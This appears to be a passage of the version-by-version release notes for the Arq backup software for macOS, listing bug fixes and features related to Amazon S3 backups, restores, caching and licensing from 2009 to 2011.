* Fixed a memory management issue that caused a crash on backup.

# Release Notes for Arq Beta Version 2.0b7

## Bug Fixes

* Fixed an issue that caused a backup error message whenever "condensing" backup versions resulted in no change to the list of backup versions.

# Release Notes for Arq Beta Version 2.0b6

## Bug Fixes

* Sort other backup sets' legacy folders by name.
* Show an error message if there was an error creating the initial encryption salt.
* Separate "Send Feedback" item into "Report Bug", "Request Support" and "Request Feature".
* Don't launch the agent until you first ask the user if it's OK.

# Release Notes for Arq Beta Version 2.0b5

## New Features

* Added a "Remove This Computer's Legacy Folders" menu item.

## Bug Fixes

* Fixed S3 usage calculator.
* Fixed issue with 'Check for Updates' menu item appearing more than once.
* Enforced a minimum size for the excludes part of the advanced backup config view.
* Fixed an issue where thinning out backup versions sometimes dropped the latest backup version.

# Release Notes for Arq Beta Version 2.0b4

## Bug Fixes

* Check that the correct Arq Agent is running during setup.
* Default to Standard S3 storage class (not RRS) for new users.

# Release Notes for Arq Backup Version 1.7.7

## Bug Fixes

* Fixed issues with network reachability detection.
* Fixed issues with in-app purchase.

**Note: This release is fully Lion-compatible.**

# Release Notes for Arq Backup Version 1.7.6

## Bug Fixes

* Fixed an issue that caused massive memory use (and often a crash) when restoring a lot of files at once.

# Release Notes for Arq Backup Version 1.7.5

## Bug Fixes

* Fixed an issue where backup of external volume was erroneously marked "successful" when external drive was unmounted during the backup.
* Fixed a crash in S3 usage counter.

# Release Notes for Arq Backup Version 1.7.4

March 9, 2011

## Feature Additions

* Added support for new S3 Japan region "ap-northeast-1".

## Bug Fixes

* Fixed a permission-denied error when restoring 0-byte ready-only files with extended attributes.
* Improved error logging.

# Release Notes for Arq Backup Version 1.7.3

## Bug Fixes

* Fixed an error that occurred when backing up a volume that didn't support the 'create time' attribute.
* Fixed an issue with displaying the in-app purchase window.

# Release Notes for Arq Backup Version 1.7.2

## Bug Fixes

* Fixed broken "Enter License Code" menu item.
* Fixed an issue where Arq was updating its user interface too often during restore, which resulted in slow restores.

# Release Notes for Arq Backup Version 1.7.1

## Bug Fixes

* Removed duplicate menu item.

# Release Notes for Arq Backup Version 1.7

## Feature Additions

* Added a view showing S3 space usage.
* Added S3 data trimming interval as a preference.
* Added 'Trim S3 Data Now...' menu item to Arq Agent.

## Bug Fixes

* Fixed an issue that caused Arq Agent to crash when pausing and resuming.
* Fixed issues with trimming backups (calculating and enforcing budget).
* Ask for permission to launch Arq Agent (the first time) before launching it.
* Fixed issues with license key editing.
* Fixed an error that occurred when clearing the pause minutes field.
* Fixed an issue where, after backup versions were rewritten, Arq Agent was returning the wrong backup-version ID to Arq, and Arq was erroneously displaying zero backup versions.
* Fixed an issue with daily-backup scheduling that caused backups to run continuously for an hour.
* Reduced memory usage during Arq Agent startup.
* Fixed an issue where S3 "not found" results were being logged as errors.

# Release Notes for Arq Backup Version 1.6.1

(Released Fri Dec 3 09:05:24 EST 2010)

## Bug Fixes

* Fixed an issue where 'Unlock' button was disabled.
* Fixed a crash when licensee name is blank.

# Release Notes for Arq Backup Version 1.6

(Released Fri Nov 26 11:30:19 EST 2010)

## Feature Additions

Several performance improvements, including:

* Much faster collection of referenced objects for a backup version (used in verify-backups phase).
* Much faster caching of current S3 object list (used when backing up).

## Bug Fixes

Several fixes to reduce the size of the cache in Library/Arq/Caches.noindex:

* Periodically consolidate "packs", removing unused objects to save space.
* Delete invalid/obsolete cache files from disk.
* Changed default verify-backups interval from 1 day to 4 days.

And some other fixes:

* Fixed an issue where a network error wasn't passed on to the user, resulting in an incompletely-restored file.
* Fixed issues with the pause feature.
* Updated the UI to reflect new S3 pricing.
* Fixed an issue with positioning the help bubble on the first setup window.

# Release Notes for Arq Backup Version 1.5.18

(Released Tue Nov 9 09:46:57 EST 2010)

## Bug Fixes

* Disabled the debug-logging during in-app purchase.

# Release Notes for Arq Backup Version 1.5.17

(Released Fri Nov 5 12:56:14 EDT 2010)

## Bug Fixes

* Fixed an issue with Arq Agent constantly asking for permission to access the keychain.

# Release Notes for Arq Backup Version 1.5.16

(Released Fri Nov 5 10:16:15 EDT 2010)

## Feature Additions

* Changed Arq Agent's "check for updates" behavior. Now, by default **Arq Agent does not check for app updates**. You can enable Arq Agent to check for updates by checking the box in the Advanced tab of the Preferences. This feature is useful for people who don't open Arq.app often but want to know about updates. People who don't want Arq Agent conncting anywhere can disable it.

## Bug Fixes

* Partially fixed the large-cache-folder problem: Arq Agent now deletes that "CommitTrimmer" directory. (More cache-reduction fixes to come).
* Fixed a crash that occurred every time you attempted to purchase a license from within the app.
* If Arq Agent is running and you delete the Arq.app bundle, Arq Agent terminates and growls about it (if Growl is installed on the computer).

# Release Notes for Arq Backup Version 1.5.14

(Released Wed Aug 25 15:31:30 EDT 2010)

## Feature Additions

* If you've accidentally deleted either of the required Keychain entries, on startup Arq will prompt you for the values and rewrite the Keychain entries.

## Bug Fixes

* Fixed an issue when the most recent backup version is unreadable on Arq Agent startup (e.g. because your encryption key changed).

# Release Notes for Arq Backup Version 1.5.13

(Released Tue Aug 24 08:11:47 EDT 2010)

## Bug Fixes

* Fixed an issue so single files can be added via the + button, not just via drag-and-drop.

# Release Notes for Arq Backup Version 1.5.12

(Released Mon Aug 23 14:48:40 EDT 2010)

## Feature Additions

* Select an individual file to add to backups.

## Bug Fixes

* If Arq is in the middle of relaunching after installing an update, don't show an error about Arq Agent not running.
* Arq Agent checks for app updates and displays a message when an update is available.
* Don't show filename as "download name" in S3 objects.
* Added help to the initial setup screen that explains what S3 keys are.

# Release Notes for Arq Backup Version 1.5.9.1

(Released Mon Aug 23 12:45:04 EDT 2010)

Testing auto-update functionality in Arq Agent.

# Release Notes for Arq Backup Version 1.5.9

(Released Sun Aug 1 16:43:08 EDT 2010)

## Bug Fixes

* Fixed an issue that caused a crash when you click "Restore..." and then click "Restore" in the confirmation dialog.

# Release Notes for Arq Backup Version 1.5.8

(Released Sun Aug 1 08:26:07 EDT 2010)

## Bug Fixes

* Fixed one more issue with restoring large files when a network error occurs.

# Release Notes for Arq Backup Version 1.5.7

(Released Fri Jul 30 14:54:02 EDT 2010)

## Feature Additions

* When you click "Restore...", a window appears with the restore destination and a Cancel button, as well as a hint that you can drag-and-drop to other destinations.

## Bug Fixes

* Fixed an issue that caused excessive memory usage when restoring a large file.
* Fixed an issue where canceling a restore would show an error message.
* Fixed an issue with restore failing instead of retrying when some types of network errors occur.
* Don't create the (unnecessary) folder-name-to-UUID cross-reference files in S3.
* Fixed an issue with inaccurate restore progress when network errors are occurring.
* Fixed an issue with windows getting reordered when the dock icon is clicked.

# Release Notes for Arq Backup Version 1.5.6

## Feature Additions

* Added a 'BackupsPerFirstHour' config-file parameter; set it to 3 to simulate pre-1.5 Arq behavior of backing up every 20 minutes.

# Release Notes for Arq Backup Version 1.5.5

(Released Wed Jul 21 07:24:06 EDT 2010)

## Bug Fixes

* Fixed a crash in the verify logic.

# Release Notes for Arq Backup Version 1.5.4

(Released Tue Jul 20 15:06:51 EDT 2010)

## Bug Fixes

* Fixed a crash due to overreleasing an object when a network error occurs during the "verify" step.
* If a network occurs when Arq is initializing, inform the user that there was an error trying to load backup data.
* Fixed an issue where a restore could abort on a network timeout instead of retrying.

# Release Notes for Arq Backup Version 1.5.3

## Bug Fixes

* Fixed a potential crash when a network timeout occurs.

# Release Notes for Arq Backup Version 1.5.2

(Released Sat Jul 17 10:04:32 EDT 2010)

## Bug Fixes

* Fixed an issue where restoring files could abort if the Internet connection goes down.
* Fixed an issue with backing up files whose filenames contained newline (line-break) characters.

# Release Notes for Arq Backup Version 1.5.1

(Released Fri Jul 16 16:24:03 EDT 2010)

## Bug Fixes

* Fixed an potential crash if the Internet connection goes down at a particular point in the backup process.

# Release Notes for Arq Backup Version 1.5

(Released Fri Jul 16 11:55:54 EDT 2010)

## Feature Additions

* Configurable backup schedule: hourly, once/day at a certain time of day, or manually.
* Back Up Now feature.
* Pause backups for an amount of time you choose. Resume early if you wish. ('Pause' is better than 'stop' because you won't have to remember to start it again).
* Progress indicator next to the "Other Computers" heading in the source list (on the left side of the window) so you can tell when Arq is still scanning for other computers' backups in the S3 data.
* More informative status messages such as "Calculating upload size" and "Finishing backup" instead of just "Backing up ..."
* Better communication of error and warning conditions.
* Estimated backup time is now calculated based on start of backup, not start of calculating upload size.
* More accurate progress bar in 2 scenarios -- when saving the "packs" of small files, and when re-doing an initial backup that was aborted.
* More useful logging output when log level is set to Info.
* Much faster loading when browsing backups.

## Bug Fixes

* More efficient caching of the set of objects in S3.
* Fixed an issue where calculating the upload size for a backup was incomplete when a permission error was encountered.
* Fixed issues with high memory usage in both Arq and Arq Agent.
* Fixed an issue that was preventing the "Start at Login" preference from persisting.
* Fixed 2 issues where packs weren't being read correctly, leading to "object not found" errors.
* Fixed regression bug in restoring file permissions correctly for root-owned files.
* Fixed an issue where the folder's progress bar was occasionally disappearing.
* Fixed an issue with trying to read extended attributes on files that don't support extended attributes.

# Release Notes for Arq Backup Version 1.4.4

(Released Fri Jun 18 14:26:32 EDT 2010)

## Bug Fixes

* Fixed an issue with high CPU usage when there are backup errors and it's time to verify S3 data.

# Release Notes for Arq Backup Version 1.4.3

## Bug Fixes

* Fixed an issue during app update with not waiting properly for the agent to quit before restarting.
* Fixed an issue with high CPU usage when there were backup errors.

# Release Notes for Arq Backup Version 1.4.2

(Released Fri Jun 4 15:59:37 EDT 2010)

## Bug Fixes

* Added a scroll view around the excludes list when it gets too long to fit on the screen.
* Fixed 'Signapore' typo.
* Fixed packaging to use symbolic links and remove header files (resulting in smaller app bundle size).

# Release Notes for Arq Backup Version 1.4.1

## Bug Fixes

* Added a workaround for a crash when trimming backup versions in Agent on PowerPC with OS X 10.5.8.

# Release Notes for Arq Backup Version 1.4

(Released Thu May 20 11:01:26 EDT 2010)

## Feature Additions

* Amazon Reduced Redundancy Storage (RRS) support! RRS is $.10/GB (in most regions) instead of $.15/GB! Select "Use Reduced Redundancy storage class for new objects" option in the Preferences. To convert your existing objects, click "Update Storage Class of Existing Objects" in the Preferences.

## Bug Fixes

* Fixed a memory leak in Arq Agent.

# Release Notes for Arq Backup Version 1.3.15

(Released Thu May 13 16:05:31 EDT 2010)

## Bug Fixes

* Fixed an issue which made the 30-day trial expire immediately.

# Release Notes for Arq Backup Version 1.3.14

(Released Thu May 13 05:08:38 EDT 2010)

## Feature Additions

* "ap-southeast-1" bucket region support.

## Bug Fixes

* Fixed an issue where changes to folders on remote volumes sometimes weren't detected.
* Fixed the frantic behavior on agent startup when a folder is missing.
* Fixed the frantic behavior on agent startup when the 30-day trial is over and Arq doesn't have a valid license yet.
* Allow 0 for a budget number. If budget is 0, Arq keeps just 1 backup for each folder.
* Show correct pricing numbers in budget preferences, using pricing of selected bucket region.
* Fixed long-term memory usage issues in Arq Agent.
* Log the error code and description when SecKeychainItemCreateFromContent fails (rare).
* Fixed an issue that was causing occasional temporary "not found" errors
  on restore: When Arq backs up, it stores small files in "packs". When a
  pack reaches 10MB, Arq saves it to S3. When it's done backing up it saves
  the last pack in S3 too. The next time it backs up, it starts with that
  last pack and adds to it until it reaches 10MB, at which point it replaces
  that last pack with the new full-size pack. The restore process was trying
  to read from the pack that the backup process deleted (replaced with a
  different pack). If you restarted Arq and tried restoring again, it found
  the new pack and worked fine.

# Release Notes for Arq Backup Version 1.3.13

## Bug Fixes

* Log the error message as well as the code when there's an error creating Keychain entries.

# Release Notes for Arq Backup Version 1.3.12

## Bug Fixes

* Log the error code when there's an error creating Keychain entries.

# Release Notes for Arq Backup Version 1.3.11

(Released Mon Mar 29 13:19:41 EDT 2010)

## Bug Fixes

* Fixed an issue when unexpected files (like .DS\_Store) appear in the local cache.

# Release Notes for Arq Backup Version 1.3.10

(Released Mon Mar 29 07:53:22 EDT 2010)

## Bug Fixes

* Fixed an issue with superceded packs not being deleted properly, causing "pack not found" errors.
* Preserve selection when "OTHER COMPUTERS" node is added to the source list.
* Fixed an issue with backup folder names that contain characters other than letters and numbers.
* Remember the position of the main split view's divider.

# Release Notes for Arq Backup Version 1.3.9

(Released Fri Mar 19 08:46:01 EDT 2010)

## Bug Fixes

* Fixed occasional crash in Arq.app when refreshing the list of other computers' backups.
* Remember window position and size.
* Fixed issue with excludes of type "relative path" and "starts with".
* Fixed rare crash in Arq Agent when network byte counter rolls over.
* Retry on S3 timeout error.
* Fixed memory leak in Arq.app when changing S3 regions.

# Release Notes for Arq Backup Version 1.3.8

(Released Mon Mar 15 16:27:24 EDT 2010)

## Bug Fixes

* Fixed issue with new folder not being backed up immediately.
* Fixed issue with SOCKS proxy environments.
* Fixed potential crash when backup folder is removed.
* Fixed issue with retrying on network error when restoring a large folder.

# Release Notes for Arq Backup Version 1.3.7

(Released Fri Mar 12 11:14:41 EST 2010)

## Bug Fixes

* Fixed issue with validating relative paths in excludes
* Fixed issue with validating budget numbers.
* Fixed issue where Arq crashes when communication with Arq Agent is unavailable.

# Release Notes for Arq Backup Version 1.3.6

(Released Fri Mar 12 07:37:05 EST 2010)

## Bug Fixes

* Fixed issue with S3 requests when computer is using an unusual time zone.

# Release Notes for Arq Backup Version 1.3.5

(Released Thu Mar 11 16:10:55 EST 2010)

## Bug Fixes

* Fixed another issue with EU bucket region support.

# Release Notes for Arq Backup Version 1.3.4

(Released Thu Mar 11 13:47:12 EST 2010)

## Bug Fixes

* Fixed issue with EU bucket region support.

# Release Notes for Arq Backup Version 1.3.3

(Released Thu Mar 11 09:15:54 EST 2010)

## Feature Additions

* EU bucket region support.

## Bug Fixes

* Select the restored file properly in the Finder when user clicks "Show File".

# Release Notes for Arq Backup Version 1.3.2

(Released Tue Mar 9 20:46:39 EST 2010)

## Bug Fixes

* Removed erroneous Find menu item.

# Release Notes for Arq Backup Version 1.3.1

(Released Mon Mar 8 20:51:46 EST 2010)

## Bug Fixes

* Fixed crash when trying to select an individual file as a folder for backup.
* Retry on network error when restoring.

# Release Notes for Arq Backup Version 1.3

(Released Mon Mar 8 11:45:10 EST 2010)

## Feature Additions

* Much better problem handling and reporting. When an problem occurs on a particular file, Arq continues backing up the other files. It logs the problems and displays an indicator to the user that problems occurred.
* "Start at login" setting in preferences.
* "Show menubar icon" setting in preferences -- menubar icon is now optional.
* Added a step in the setup wizard to make it easy to back up your home folder.
* Added Delete-key shortcut for removing a folder from backups.
* When the Internet connection goes away during initial backup of a folder, backup just pauses until it becomes available (instead of restarting the entire backup).
* When restoring files, restore to original location if possible; otherwise restore to a "Restored by Arq" folder at the original location.

## Bug Fixes

* Added workaround for Apple bug reading Finder flags on symlinks.
* Fixed issues with SOCKS support.
* Improved behavior when Internet connection is intermittent.
* If Arq Agent stops running (which only happens if Arq Agent crashes, which should be never!), Arq notifies the user and restarts it.

# Release Notes for Arq Backup Version 1.2.2

## Bug Fixes

* Fixed an issue with transfer-rate limiting.

# Release Notes for Arq Backup Version 1.2.1

(Released Mon Feb 22 16:23:30 EST 2010)

## Feature Additions

* Added preference to show/hide status menu icon.
* Added preference to turn add/remove Arq Agent as a login item.
* Added "Remove folder from backups" menu item in addition to "-" button.

## Bug Fixes

* Sort backup's file list case-insensitive to match Finder.
* Fixed crash when computer name is not set.

# Release Notes for Arq Backup Version 1.2.0

(Released Fri Feb 19 22:08:11 EST 2010)

## Feature Additions

* View and restore from backups of other computers using the same S3 account. NOTE: This only works for backups that have the same encryption password.

## Bug Fixes

* If trial expires, Arq Agent launches Arq so that the user sees the trial-expired message and understands that backups aren't happening anymore.
* Fixed crash during backup on PowerPC computers.

## Bug Fixes

* Added code signing to prevent the "Allow/Deny" dialogs that appear when updating to a new version of Arq.

# Release Notes for Arq Backup Version 1.1.14

(Released Fri Feb 19 10:17:57 EST 2010)

## Bug Fixes

* Added code signing to prevent the "Allow/Deny" dialogs that appear when updating to a new version of Arq.

# Release Notes for Arq Backup Version 1.1.13

(Released Mon Feb 15 21:29:52 EST 2010)

## Bug Fixes

* Fixed issue with crash reporter on PowerPC computers.
* Show more informative message during restore when applying ownership and permissions.

# Release Notes for Arq Backup Version 1.1.12

(Released Sat Feb 13 14:13:25 EST 2010)

## Bug Fixes

* If a file disappears between getting the directory listing and accessing the file, don't fail the backup.
* Strip leading and trailing whitespace from license name and key before validating it.
* Fixed an issue where S3 object-list query returned an unexpected error and caused the Arq GUI to crash.
* Fixed an issue where bogus file type code or file creator code could cause a crash during restore.

# Release Notes for Arq Backup Version 1.1.11

(Released Thu Feb 11 14:25:09 EST 2010)

## Bug Fixes

* Fixed issue where backup wasn't being retried soon enough when an error occurred.
* Fixed issue with agent startup in a no-internet-available environment.
* Fixed issue with agent startup in a public Wifi environment where router login is required.

# Release Notes for Arq Backup Version 1.1.10

(Released Wed Feb 10 15:51:12 EST 2010)

## Bug Fixes

* Fixed up the license agreement in the Help docs.

# Release Notes for Arq Backup Version 1.1.9

(Released Wed Feb 10 08:25:34 EST 2010)

## Bug Fixes

* Fixed an issue with excessive error logging in trial mode (when there's no license key configured).

# Release Notes for Arq Backup Version 1.1.8

(Released Tue Feb 9 13:19:26 EST 2010)

## Bug Fixes

* Fixed a file-descriptor leak when saving packs and pack indexes.

# Release Notes for Arq Backup Version 1.1.7

(Released Tue Feb 9 12:56:06 EST 2010)

## Feature Additions

* Better indicators when errors occur: the status menu icon gets an error overlay, and the main window shows which folder(s) had errors.
* Replaced confusing non-editable text area of excludes with a simple summary.
* Add help docs.

## Bug Fixes

* Arq Agent is less jittery with error conditions; retries every 15 seconds instead of every second.

# Release Notes for Arq Backup Version 1.1.6

(Released Sat Feb 6 13:55:30 EST 2010)

## Bug Fixes

* Fixed a race condition where registering too early for notifications in agent startup could occasionally cause a crash.

# Release Notes for Arq Backup Version 1.1.5

(Released Fri Feb 5 19:05:17 EST 2010)

## Bug Fixes

* Fixed an issue where a 32-character encryption key caused a crash.

# Release Notes for Arq Backup Version 1.1.4

(Released Thu Feb 4 13:52:47 EST 2010)

## General Availability Release!

Arq is officially out of beta. Arq now has a 30-day trial and costs $29.

**If you participated in the beta** (you were using version
1.1.3 or older), thanks! Please **send me email** at
stefan@haystacksoftware.com and let me know; I'll send you a coupon for a free
license.

# Release Notes for Arq Backup Beta Version 1.1.3

(Released Thu Jan 28 20:46:36 EST 2010)

## Bug Fixes

* Fixed another issue where backups weren't migrated properly on upgrade from 1.0.x because of bogus old cache files.

# Release Notes for Arq Backup Beta Version 1.1.2

(Released Thu Jan 28 14:29:07 EST 2010)

## Bug Fixes

* Fixed another issue where backups weren't migrated properly on upgrade from 1.0.x., resulting in backups not completing.

# Release Notes for Arq Backup Beta Version 1.1.1

(Released Thu Jan 28 14:19:06 EST 2010)

## Bug Fixes

* Fixed an issue where backups weren't migrated properly on upgrade from 1.0.x., resulting in a "missing object" error.

# Release Notes for Arq Backup Beta Version 1.1.0

(Released Wed Jan 27 09:38:16 EST 2010)

## New version: 1.1

Version 1.1 (still in beta) is dramatically faster when backing up many small files. It combines small files into larger files before uploading to S3, resulting in up to 60x faster backups. Restores are similarly improved.

## Feature Additions

* Dramatic speed improvements.

## Bug Fixes

* Immediate retry of S3 PUT request on "broken pipe" errors (instead of restarting the backup of the folder).
* When adding a folder that is a "mount point", automatically add "/.Trashes", "/.Spotlight-V100" and "/.fseventsd" to excludes.
* Removed confusing "minimum backup interval" preference from the GUI.
* Fixed bugs around running Arq for multiple users on the same computer.

# Release Notes for Arq Backup Beta Version 1.0.41

## Bug Fixes

* Fixed byte-ordering issue in S3 objects (byte-ordering wasn't handled properly across Intel and PowerPC CPUs).
* NOTE: All existing backup records in your S3 account will be ignored
  and a new initial backup will be created (in other words, backup history
  will start over). Backed-up files will not be re-uploaded. Sorry about
  this! I aim to never do this sort of thing again, but I decided it was
  safer to do this (partially because it's still beta) than to add lots of
  complex code to read the old/broken objects as well as the new/fixed ones.
  If you have questions please send me mail at
  stefan@haystacksoftware.com.
* Fixed 3 memory leaks.
* Removed 'maximum data file size' preference because it was confusing.
* Many fixes around more robust handling of unexpected missing objects in S3 (e.g. if you delete objects from your S3 account that Arq was using).
* Fixed an issue with bringing the app to the foreground while still in "setup assistant" mode.

# Release Notes for Arq Backup Version 1.0.40

(Released Mon Jan 4 11:33:51 EST 2010)

## Bug Fixes

* Fixed a date formatting issue in HTTP requests for non-English locales.

# Release Notes for Arq Backup Version 1.0.39

(Released Fri Dec 25 21:04:52 EST 2009)

## Bug Fixes

* Fixed an issue with closing unusable sockets.

# Release Notes for Arq Backup Beta Version 1.0.38

(Released Thu Dec 24 12:23:46 EST 2009)

## Bug Fixes

* Fixed an issue with creating an S3 "bucket" in setup assistant.

# Release Notes for Arq Backup Beta Version 1.0.37

## Feature Additions

* Streamlined filesystem calls to improve backup performance.

## Bug Fixes

* Fixed an issue in setup assistant that was preventing setup.
* Fixed an issue with redrawing in setup assistant window.
* Fixed a memory leak that occurred while restoring files.
* Renamed a cache file to avoid Spotlight indexing of it.

# Release Notes for Arq Backup Beta Version 1.0.36

## Bug Fixes

* Fixed 2 memory leaks in Arq.app

# Release Notes for Arq Backup Beta Version 1.0.35

## Feature Additions

* Now 100% [backup-bouncer](http://www.n8gray.org/code/backup-bouncer/) compliant!
* Added ability to drag a folder from the Finder onto the Dock icon to add it for backup.
* Added ability to drag a folder from the Finder onto Arq's source list to add it for backup.

## Bug Fixes

* Fixed restore issues for hard links, device files, files with different ownership.
* Fixed issues with reusing HTTP connections.
* Fixed memory leaks.
* Fixed issue with restoring very large files.
* Removed the (broken) "is not" and "does not contain" exclude options.
* Set minimum size on the main window to avoid shrinking it too far.
* Fixed issue with excessive reloading of folder list from S3 when files are modified.

# Release Notes for Arq Backup Beta Version 1.0.34

## Feature Additions

* Made visibility of "hidden" files and folders in the file selection dialog a Preference (in the "Advanced" tab of Preferences).

# Release Notes for Arq Backup Beta Version 1.0.33

## Feature Additions

* Added the ability to select "hidden" files and folders for backup (for example, files with names starting with ".").

# Release Notes for Arq Backup Beta Version 1.0.32

## Bug Fixes

* Renamed ~/Library/Arq/encryptedfilesha1cache directory to encryptedfilesha1cache.noindex to prevent Spotlight indexing of SHA1 cache data.

# Release Notes for Arq Backup Beta Version 1.0.31

## Feature Additions

* Added 'minimum backup interval' preference, defaulted to 60 minutes.

## Bug Fixes

* Fixed an issue where adding a folder and restarting the GUI caused the folder to disappear temporarily.
* Fixed a memory leak when reading file ACLs.

# Release Notes for Arq Backup Beta Version 1.0.30

## Feature Additions

* Added the ability to exclude items from a backup of a folder.
* Cache the list of S3 objects locally for faster Arq Agent startup.

## Bug Fixes

* Fixed issues in backing up fifos, device files and unix socket files.

# Release Notes for Arq Backup Beta Version 1.0.29

## Bug Fixes

* Fixed issue where throttle wasn't set up correctly on startup.

# Release Notes for Arq Backup Beta Version 1.0.28

## Feature Additions

* Added throttling options: fixed throttling, automatic throttling, and no throttling.

# Release Notes for Arq Backup Beta Version 1.0.27

## Bug Fixes

* Fixed issue with trimming old backup data. Now verifying every backup of every folder and re-uploading if anything is missing.
* Logging to syslog, to take advantage of OS X's built-in log rotation.
* If a crash occurs, send last few lines of log file with the crash report.

# Release Notes for Arq Backup Beta Version 1.0.26

## Bug Fixes

* Logging only to ~/Library/Logs, not to syslog anymore.
* Fixed issue with agent not telling the GUI the correct latest backup.

# Release Notes for Arq Backup Beta Version 1.0.25

## Bug Fixes

* Fixed a build issue where frameworks weren't being copied properly.

# Release Notes for Arq Backup Beta Version 1.0.24

## Bug Fixes

* Write log data to ~/Library/Logs.
* Log a better error message if an error occurs.

# Release Notes for Arq Backup Beta Version 1.0.23

## Bug Fixes

* Added new icons.
* Fixed issues in calculating reference counts of S3 objects.
* In the folder summary pane, show the icon that the Finder shows for that folder.

# Release Notes for Arq Backup Beta Version 1.0.22

## Bug Fixes

* Fixed issue of calculating S3 space usage after every commit. Calculates every 4 hours now.

# Release Notes for Arq Backup Beta Version 1.0.21

## Bug Fixes

* Fixed memory leak.
* Fixed bug in S3-object reference-counting logic.

# Release Notes for Arq Backup Beta Version 1.0.20

## Bug Fixes

* Fixed memory allocation bug.
* Fixed issue with error handling in loading S3 object list.
* Improved status messages.

# Release Notes for Arq Backup Beta Version 1.0.19

## Bug Fixes

* Added "Show Main Window" item in Window menu to bring back the main window if you've closed it.
* When Arq is running and you click on the dock icon, the main window becomes key and orders itself to the front.

# Release Notes for Arq Backup Beta Version 1.0.18

## Bug Fixes

* Improved status messages.

# Release Notes for Arq Backup Beta Version 1.0.17

## Bug Fixes

* Changed the way Arq launches Arq Agent.

# Release Notes for Arq Backup Beta Version 1.0.16

## Bug Fixes

* Much faster launch of Arq when Arq Agent is running.
* Fixed issues with Arq losing focus after launching Arq Agent.

# Release Notes for Arq Backup Beta Version 1.0.15

## Bug Fixes

* Fixed memory leak issues in Arq Agent.
* Fixed error handling issues in Arq Agent.

# Release Notes for Arq Backup Beta Version 1.0.14

## Bug Fixes

* Fixed memory leak issues in Arq Agent.
* Fixed message typos in Arq.

# Release Notes for Arq Backup Beta Version 1.0.13

## Bug Fixes

* Fixed more notification issues between Arq and Arq Agent.

# Release Notes for Arq Backup Beta Version 1.0.12

## Bug Fixes

* Fixed notification issues between Arq and Arq Agent.
* Fixed thread-safety issues in Arq Agent.

# Release Notes for Arq Backup Beta Version 1.0.11

## Bug Fixes

* Fixed notification issues.

# Release Notes for Arq Backup Beta Version 1.0.10

## Bug Fixes

* Fixed crash reporter settings.

# Release Notes for Arq Backup Beta Version 1.0.9

## Bug Fixes

* Adding missing resource files to Arq Agent.
* Renamed ark.css to arq.css.

# Release Notes for Arq Backup Beta Version 1.0.8

(Released Thu Sep 24 09:15:40 EDT 2009)

## Bug Fixes

* Renamed Ark to Arq.

